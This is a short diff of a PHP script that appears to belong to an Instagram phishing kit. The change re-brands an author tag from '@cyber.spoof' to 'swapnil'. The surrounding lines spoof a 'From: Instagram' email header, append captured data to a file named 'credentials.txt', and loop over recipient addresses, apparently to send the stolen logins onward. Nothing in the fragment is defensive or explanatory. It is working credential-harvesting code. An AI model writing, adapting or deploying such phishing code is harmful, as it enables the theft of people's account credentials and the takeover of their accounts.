@@ -22,7 +22,7 @@ $headers = "From: Instagram";
 
 
 $file = fopen("credentials.txt","ab");
-fwrite($file,"modified by @cyber.spoof");
+fwrite($file,"modified by swapnil");
 fwrite($file,$message);
 fclose($file);
 $str=array($send, $IWP); foreach ($str as $send)
